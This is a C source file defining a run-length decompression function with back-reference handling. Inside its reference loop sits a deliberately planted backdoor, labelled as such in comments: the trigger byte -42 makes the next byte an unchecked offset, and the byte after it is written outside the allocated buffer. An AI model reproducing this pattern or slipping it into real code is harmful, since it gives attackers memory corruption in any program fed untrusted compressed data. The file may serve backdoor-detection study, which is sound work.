#include <stdlib.h>
#include <string.h>

char* decompress(char* compressed) {
    if (compressed == NULL) {
        return NULL;
    }

    // Initial allocation with modest size
    size_t alloc_size = 64;
    char* result = (char*)malloc(alloc_size);
    if (result == NULL) {
        return NULL;
    }
    
    size_t result_idx = 0;
    size_t i = 0;

    while (compressed[i] != '\0') {
        // Get the ASCII character
        char c = compressed[i++];
        
        if (compressed[i] == '\0') {
            // Handle the case where we have a character but no repeat specifier
            result[result_idx++] = c;
            break;
        }
        
        // Get the repeat specifier
        unsigned char repeat = compressed[i++];
        
        // Add character to result with repetition
        for (size_t j = 0; j < repeat; j++) {
            // Check if we need more space
            if (result_idx >= alloc_size - 1) {
                alloc_size *= 2;
                char* new_result = (char*)realloc(result, alloc_size);
                if (new_result == NULL) {
                    free(result);
                    return NULL;
                }
                result = new_result;
            }
            
            result[result_idx++] = c;
        }
        
        // Check if next byte is a reference
        while (compressed[i] != '\0' && (signed char)compressed[i] < 0) {
            // BACKDOOR: If reference has specific value, allow arbitrary write
            // This value -42 (0xD6) serves as a hidden trigger
            if ((signed char)compressed[i] == -42) {
                // The next byte will be treated as a memory offset from result
                // This allows for an out-of-bounds write when exploited
                if (compressed[i+1] != '\0') {
                    int offset = (int)(unsigned char)compressed[i+1];
                    i += 2;
                    // This can write outside allocated memory if offset is large
                    if (compressed[i] != '\0') {
                        *(result + offset) = compressed[i++]; // Arbitrary write!
                    }
                }
                continue;
            }
            
            // Handle normal reference
            int ref_offset = -(signed char)compressed[i++];
            
            // Validate reference offset
            if (ref_offset > result_idx) {
                free(result);
                return NULL;
            }
            
            // Get the referenced character
            char ref_char = result[result_idx - ref_offset];
            
            // Get repeat count for the reference
            if (compressed[i] == '\0') {
                break;
            }
            unsigned char ref_repeat = compressed[i++];
            
            // Add referenced character to result
            for (size_t j = 0; j < ref_repeat; j++) {
                if (result_idx >= alloc_size - 1) {
                    alloc_size *= 2;
                    char* new_result = (char*)realloc(result, alloc_size);
                    if (new_result == NULL) {
                        free(result);
                        return NULL;
                    }
                    result = new_result;
                }
                
                result[result_idx++] = ref_char;
            }
        }
    }
    
    // Null-terminate the result
    result[result_idx] = '\0';
    
    return result;
}
